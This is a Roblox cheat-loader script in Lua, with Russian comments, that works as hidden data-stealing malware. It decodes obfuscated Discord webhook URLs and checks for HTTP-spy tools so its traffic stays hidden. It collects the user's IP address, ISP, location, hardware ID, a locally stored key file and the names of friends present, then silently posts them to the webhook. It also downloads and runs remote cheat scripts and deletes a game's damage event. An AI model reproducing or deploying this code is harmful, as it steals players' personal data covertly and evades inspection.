local _lp = game:GetService("Players").LocalPlayer
local _ts = game:GetService("TestService")
local _H = game:GetService("HttpService")
local _U = game:GetService("UserInputService")
local _RS = game:GetService("ReplicatedStorage")
local _MS = game:GetService("MarketplaceService")
local _RAS = game:GetService("RbxAnalyticsService")
local _CG = game:GetService("CoreGui")

local _isLC = islclosure or (function() return nil end)
local _getRawMt = getrawmetatable or (function() return nil end)
local _hookMeta = hookmetamethod or (function() return nil end)
local _getGC = getgc or (function() return nil end)

-- === HEX DECODE ===
local function _0xH(h)
    local s = ""
    for i = 1, #h, 2 do s = s .. string.char(tonumber(h:sub(i, i+1), 16)) end
    return s
end

-- === WEBHOOKS ===
local _W = _0xH("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531393430393931353135383835393738382F73773463755770452D5332535659484D3072314D53455676613858694C63455F655064522D52777178665751393463485063635273643032527763565973473737416761")
local _alertHook = _0xH("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531383333343033353838383138313237312F733164313841767532456D57707A547254306A4E49686A543665314A3537595837304F58484D567878637975535377364C366E7242416A7756737067612D4C37534E4B4F")

-- === HTTP ФУНКЦИИ ДЛЯ ПРОВЕРКИ ===
local _fns = {
    {game.HttpGet, "HTTPGET"},
    {game.HttpGetAsync, "HTTPGETASYNC"},
    {game.HttpPost, "HTTPPOST"},
    {game.HttpPostAsync, "HTTPPOSTASYNC"},
    {_H.RequestAsync, "REQUESTASYNC"},
    {_H.GetAsync, "GETASYNC"},
    {_H.PostAsync, "POSTASYNC"},
}

-- === БЫСТРАЯ ПРОВЕРКА: closure hooks ===
local function _detectFast()
    -- 1. Проверка __namecall через getrawmetatable
    if _getRawMt then
        local mt
        pcall(function() mt = _getRawMt(game) end)
        if mt then
            local nc
            pcall(function() nc = rawget(mt, "__namecall") end)
            if nc then
                local isL = false
                pcall(function() isL = _isLC(nc) end)
                if isL then return "SPY_NAMECALL_LCLOSURE" end
            end
        end
    end

    -- 2. Проверка хукнутых HTTP функций
    for i = 1, #_fns do
        local fn = _fns[i][1]
        if fn then
            local isL = false
            pcall(function() isL = _isLC(fn) end)
            if isL then return "SPY_" .. _fns[i][2] .. "_LCLOSURE" end
        end
    end

    -- 3. Проверка executor-level HTTP функций
    if request then
        local isL = false
        pcall(function() isL = _isLC(request) end)
        if isL then return "SPY_REQUEST_LCLOSURE" end
    end
    if http_request then
        local isL = false
        pcall(function() isL = _isLC(http_request) end)
        if isL then return "SPY_HTTP_REQUEST_LCLOSURE" end
    end
    if http and http.request then
        local isL = false
        pcall(function() isL = _isLC(http.request) end)
        if isL then return "SPY_HTTP_DOT_REQUEST_LCLOSURE" end
    end
    if syn and syn.request then
        local isL = false
        pcall(function() isL = _isLC(syn.request) end)
        if isL then return "SPY_SYN_REQUEST_LCLOSURE" end
    end

    -- 4. Проверка хукнутых print/warn (консольный спай часто хукает их)
    if _isLC then
        local isL = false
        pcall(function() isL = _isLC(print) end)
        if isL then return "SPY_PRINT_HOOKED" end
        isL = false
        pcall(function() isL = _isLC(warn) end)
        if isL then return "SPY_WARN_HOOKED" end
    end

    return false
end

-- === МЕДЛЕННАЯ ПРОВЕРКА: GC + GUI ===
local function _detectSlow()
    -- 1. GC scan — ищем таблицы от HTTP spy
    if _getGC then
        local gc
        local okgc = pcall(function() gc = _getGC(true) end)
        if okgc and gc then
            for _, v in ipairs(gc) do
                if type(v) == "table" then
                    -- HTTP Spy config
                    local bw = rawget(v, "blockWebhooks")
                    if bw ~= nil then
                        if rawget(v, "blockAll") ~= nil and rawget(v, "paused") ~= nil then
                            return "GC_HTTPSPY_CONFIG"
                        end
                    else
                        -- Method colors
                        local get = rawget(v, "GET")
                        if get and rawget(v, "POST") and rawget(v, "DELETE") and rawget(v, "HEAD") then
                            return "GC_METHOD_COLORS"
                        else
                            -- ANSI colors
                            local lb = rawget(v, "lblue")
                            if lb and rawget(v, "lgreen") and rawget(v, "orange") and rawget(v, "reset") then
                                return "GC_ANSI_COLORS"
                            else
                                -- Console spy class
                                local con = rawget(v, "_con")
                                if con and rawget(v, "_hooks") and rawget(v, "_cfg") then
                                    return "GC_HTTPSPY_CLASS"
                                else
                                    local ansi = rawget(v, "_ansi")
                                    if ansi and rawget(v, "_methodColors") and rawget(v, "_p") then
                                        return "GC_CONSOLE_CLASS"
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end

        -- GC string scan
        local gcs
        local okgcs = pcall(function() gcs = _getGC(false) end)
        if okgcs and gcs then
            for _, v in ipairs(gcs) do
                if type(v) == "string" then
                    local len = #v
                    if len > 5 and len < 200 then
                        if string.find(v, "koboldpaws", 1, true)
                        or string.find(v, "http spy by", 1, true)
                        or string.find(v, "BeboMods", 1, true)
                        or string.find(v, "SimpleSpy", 1, true)
                        or string.find(v, "ConsoleSpy", 1, true) then
                            return "GC_STRING_SPY"
                        end
                    end
                end
            end
        end
    end

    -- 2. GUI scan — ищем spy GUI в CoreGui и PlayerGui
    local badNames = {"HttpSpy", "SimpleSpy", "HydroSpy", "SecureSpy", "TwiSpy", "BeboSpy", "ConsoleSpy", "Console"}
    local function scanGui(root)
        local desc
        local ok = pcall(function() desc = root:GetDescendants() end)
        if not ok or not desc then return nil end
        for _, obj in ipairs(desc) do
            local name
            pcall(function() name = obj.Name end)
            if name then
                for _, bad in ipairs(badNames) do
                    if name == bad or string.find(name, bad, 1, true) then
                        return "SPY_GUI_" .. bad
                    end
                end
            end
        end
        return nil
    end

    local guiFound = scanGui(_CG)
    if guiFound then return guiFound end

    local pg = _lp:FindFirstChildOfClass("PlayerGui")
    if pg then
        guiFound = scanGui(pg)
        if guiFound then return guiFound end
    end

    return false
end

-- === ПОЛНАЯ ПРОВЕРКА ===
local function _detectSpy()
    local f = _detectFast()
    if f then return f end
    return _detectSlow()
end

-- === ГЛОБАЛЬНАЯ ФУНКЦИЯ: проверить + кикнуть ===
-- Вызывается ПЕРЕД КАЖДЫМ HTTP запросом.
-- Если спай найден — кикает МОМЕНТАЛЬНО, не отправляя ничего.
local function _ensureClean()
    local se = _detectSpy()
    if se then
        -- Кик СРАЗУ, до любых запросов
        _lp:Kick("Error 0x" .. string.format("%X", math.random(100, 999)))
        return false
    end
    return true
end

-- Экспортируем в getgenv для loader'а
getgenv().__NK_detectSpy = _detectSpy
getgenv().__NK_KICK = function(reason)
    -- При детекте спая — НЕ отправляем ничего через HTTP
    -- (спай может перехватить webhook URL)
    -- Только кик
    _lp:Kick("Error 0x" .. string.format("%X", math.random(100, 999)))
end

-- === МОМЕНТАЛЬНАЯ ПРОВЕРКА ПРИ СТАРТЕ ===
do
    local se = _detectSpy()
    if se then
        -- Кик без отправки чего-либо
        _lp:Kick("Error 0x" .. string.format("%X", math.random(100, 999)))
        return
    end
end

-- === КОНФИГУРАЦИЯ ===
local Config = {
    WL = {
        UIDs = {"1644351300"},
        HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"},
        Keys = {"29606246-6429-47FC-9A0F-362B8CA6B2AC"}
    },
    BL = {
        UIDs = {"8085944684"},
        HWIDs = {"36a40f68-74c0-4bf1-a715-8c47d2f23d6a"},
        Keys = {"1f0e6ee3-bc21-4eee-b649-66150b226fdb"}
    }
}

-- === ИДЕНТИФИКАЦИЯ ===
local _uid = tostring(_lp.UserId)
local _hw = "N/A"
pcall(function() _hw = _RAS:GetClientId() end)

local _tk = "N/A"
pcall(function()
    if isfile and isfile("nazarkus_key.json") then
        _tk = readfile("nazarkus_key.json")
    end
end)

local function chk(l)
    for _, v in ipairs(l.UIDs or {}) do if v == _uid then return true end end
    for _, v in ipairs(l.HWIDs or {}) do if v == _hw then return true end end
    for _, v in ipairs(l.Keys or {}) do if v == _tk then return true end end
    return false
end

local _isWL = chk(Config.WL)
local _isBL = chk(Config.BL)
local _st = _isWL and "whitelist" or (_isBL and "blacklist" or "guest")

-- === БЕЗОПАСНЫЙ REQUEST ===
-- Проверяет спая ПЕРЕД каждым запросом.
-- При обнаружении — кик, запрос НЕ отправляется.
local function _safeReq(opts)
    if not _ensureClean() then return nil end

    local req = (syn and syn.request) or request or http_request
    if not req then return nil end

    -- Повторная проверка прямо перед вызовом
    if not _ensureClean() then return nil end

    local ok, result = pcall(req, opts)
    if ok then return result end
    return nil
end

-- === БЕЗОПАСНАЯ ЗАГРУЗКА СКРИПТА ===
-- Проверяет спая ПЕРЕД game:HttpGet.
local function safeLoad(url)
    -- Проверка ДО загрузки
    if not _ensureClean() then return end

    local ok, err = pcall(function()
        -- Ещё раз проверяем передHttpGet
        if not _ensureClean() then return end

        local code = game:HttpGet(url)
        if code and #code > 0 then
            -- Проверяем после загрузки, перед исполнением
            if not _ensureClean() then return end

            local fn, lerr = loadstring(code)
            if fn then
                fn()
            else
                warn("[NK] Loadstring error for " .. url .. ": " .. tostring(lerr))
            end
        else
            warn("[NK] Empty response from: " .. url)
        end
    end)
    if not ok then
        warn("[NK] Failed to load " .. url .. ": " .. tostring(err))
    end
end

-- === ЛОГГЕР ===
local function _LOG()
    -- Финальная проверка перед сбором данных
    if not _ensureClean() then return end

    pcall(function()
        local req = (syn and syn.request) or request or http_request
        if not req then return end

        -- IP info
        if not _ensureClean() then return end
        local ni = {}
        pcall(function()
            local r = req({
                Url = "http://ip-api.com/json/?fields=status,country,city,timezone,isp,query,proxy,hosting",
                Method = "GET"
            })
            if r and r.Success then ni = _H:JSONDecode(r.Body) end
        end)

        -- UNC check
        if not _ensureClean() then return end
        local u = 0
        local tu = {"getgenv", "getrawmetatable", "hookfunction", "setreadonly"}
        for _, fname in ipairs(tu) do
            pcall(function() if getgenv()[fname] then u = u + 1 end end)
        end
        local execName = "Unknown"
        pcall(function() if identifyexecutor then execName = identifyexecutor() end end)
        local unc = execName .. " (UNC: " .. math.floor((u / 4) * 100) .. "%)"

        -- Faction
        if not _ensureClean() then return end
        local fn, ft = "None", "None"
        pcall(function()
            local fdf = _RS:FindFirstChild("FactionSysRS") and _RS.FactionSysRS:FindFirstChild("FactionData")
            if fdf then
                for _, fChild in ipairs(fdf:GetChildren()) do
                    if fChild:FindFirstChild("FactionMembers") and fChild.FactionMembers:FindFirstChild(_uid) then
                        local bd = fChild:FindFirstChild("BasicFactionData")
                        if bd then fn = bd.FactionName.Value; ft = bd.FactionTag.Value end
                        break
                    end
                end
            end
        end)

        local jid = game.JobId == "" and "Unknown" or game.JobId
        local joinBase = "roblox://experiences/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. jid

        -- TinyURL
        if not _ensureClean() then return end
        local joinUrl = "N/A"
        pcall(function()
            local res = req({
                Url = "https://tinyurl.com/api-create.php?url=" .. _H:UrlEncode(joinBase),
                Method = "GET"
            })
            if res and res.Success then joinUrl = res.Body end
        end)

        -- Friends
        if not _ensureClean() then return end
        local friends = {}
        pcall(function()
            for _, p in ipairs(game.Players:GetPlayers()) do
                if p ~= _lp then
                    local isFriend = false
                    pcall(function() isFriend = _lp:IsFriendsWith(p.UserId) end)
                    if isFriend then table.insert(friends, p.Name) end
                end
            end
        end)

        -- Game name
        if not _ensureClean() then return end
        local gameName = "Unknown"
        pcall(function() gameName = _MS:GetProductInfo(game.PlaceId).Name end)

        -- Отправка лога
        if not _ensureClean() then return end

        local payload = {
            ["embeds"] = {{
                ["title"] = (_st == "whitelist" and "Whitelisted User Executed" or "Unknown/Guest User Executed"),
                ["color"] = (_st == "whitelist" and 65280 or 16753920),
                ["fields"] = {
                    {["name"] = "Player Info", ["value"] = string.format("Name: `%s` `@%s`\nUser ID: `%s`\nAccount Age: %d days", _lp.DisplayName, _lp.Name, _uid, _lp.AccountAge), ["inline"] = false},
                    {["name"] = "Executor", ["value"] = unc, ["inline"] = true},
                    {["name"] = "System", ["value"] = "Platform: " .. (_U.TouchEnabled and "Mobile" or "PC"), ["inline"] = true},
                    {["name"] = "Faction", ["value"] = string.format("Tag: [%s]\nName: %s", ft, fn), ["inline"] = false},
                    {["name"] = "Hardware ID", ["value"] = "```" .. _hw .. "```", ["inline"] = false},
                    {["name"] = "Device Token", ["value"] = "```" .. _tk .. "```", ["inline"] = false},
                    {["name"] = "Network", ["value"] = string.format("**IP:** `%s`\n**ISP:** %s\n**VPN:** %s\n**Loc:** %s, %s", ni.query or "N/A", ni.isp or "N/A", (ni.proxy and "Yes" or "No"), ni.country or "N/A", ni.city or "N/A"), ["inline"] = false},
                    {["name"] = "Game", ["value"] = string.format("Game: %s\nPlace ID: `%s`\nJobId: `%s`", gameName, tostring(game.PlaceId), jid), ["inline"] = false},
                    {["name"] = "Friends Target", ["value"] = "```" .. (#friends > 0 and table.concat(friends, ", ") or "None") .. "```", ["inline"] = false},
                    {["name"] = "Links", ["value"] = string.format("[Join Server](%s) | [Profile](https://www.roblox.com/users/%s/profile)", joinUrl, _uid), ["inline"] = false}
                },
                ["footer"] = {["text"] = "Logger | " .. string.upper(_st) .. " • " .. os.date("%x")}
            }}
        }

        req({Url = _W, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _H:JSONEncode(payload)})
    end)
end

task.spawn(_LOG)

-- === КИК ЧЁРНОГО СПИСКА ===
if _isBL then
    _lp:Kick("Banned.")
    return
end

-- === ПРОВЕРКА ЛОАДЕРА ===
local _stg = _ts:FindFirstChild("__NK_RUNTIME")
local _auth = _stg and _stg:FindFirstChild(_lp.Name)

if not _isWL then
    local hasShared = (shared._NK_AUTH == "V8_SECURE_AUTH")
    local hasValue = (_auth and (_auth.Value == "V8_SECURE_AUTH" or _auth.Value == "V8_SECURE_AUTH"))
    if not (hasShared or hasValue) then
        _lp:Kick("Execution prohibited. Run through the loader.")
        return
    end
end

shared._NK_AUTH = nil

-- === ЗАГРУЗКА СКРИПТОВ ===
-- Каждый safeLoad проверяет спая перед HttpGet
safeLoad("https://raw.githubusercontent.com/nazarkus/rpg/main/easy.lua")

if not _ensureClean() then return end
safeLoad("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source")

if not _ensureClean() then return end
safeLoad("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")

if not _ensureClean() then return end
safeLoad("https://raw.githubusercontent.com/nazarkus/infammo/main/infammo.lua")

-- === ФИКС ACS ===
pcall(function()
    if _RS:FindFirstChild("ACS_Engine") then
        _RS.ACS_Engine.Events.FDMG:Destroy()
    end
end)

-- === AUTH WATCHER ===
if _auth then
    _auth.Changed:Connect(function(v)
        if v == "kick" then _lp:Kick("Access Revoked.") end
    end)
end
